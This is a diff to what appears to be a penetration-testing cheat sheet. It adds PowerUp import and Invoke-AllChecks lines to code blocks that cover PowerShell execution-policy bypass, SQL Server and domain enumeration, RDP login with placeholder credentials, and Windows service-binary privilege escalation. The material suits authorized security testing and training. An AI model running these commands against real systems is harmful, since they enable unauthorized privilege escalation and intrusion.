@@ -4028,6 +4028,8 @@ Get Instance
 
 ```c
 powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
+Import-Module PowerUp.ps1
+Invoke-AllChecks
 powershell Get-SQLInstanceDomain
 powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo // If multiple
 .\SQLRecon.exe /enum:sqlspns
@@ -5908,7 +5910,9 @@ xfreerdp -v:IP5 -u:USERNAME -p:'PASS' +clipboard -cert:ignore
 
 ```c
 powershell -ep bypass
+Import-Module PowerUp.ps1
 . .\PowerUp.ps1
+Invoke-AllChecks
 Get-NetDomain
 Get-Domain //  object for the current
 Get-DomainController | select Forest, Name, OSVersion | fl
@@ -9252,7 +9256,9 @@ Get-LocalGroupMember administrators
 
 ```c
 powershell -ep bypass
+Import-Module PowerUp.ps1
 . .\PowerUp.ps1
+Invoke-AllChecks
 Get-ModifiableServiceFile
 Install-ServiceBinary -Name '<SERVICE>'
 ```
@@ -9351,7 +9357,9 @@ sc start "Vulnerable Service 1"
 
 ```c
 powershell -ep bypass
+Import-Module PowerUp.ps1
 . .\PowerUp.ps1
+Invoke-AllChecks
 Get-UnquotedService
 Write-ServiceBinary -Name '<SERVICE>' -Path "C:\Program Files\my example\example.exe"
 Start-Service <SERVICE>
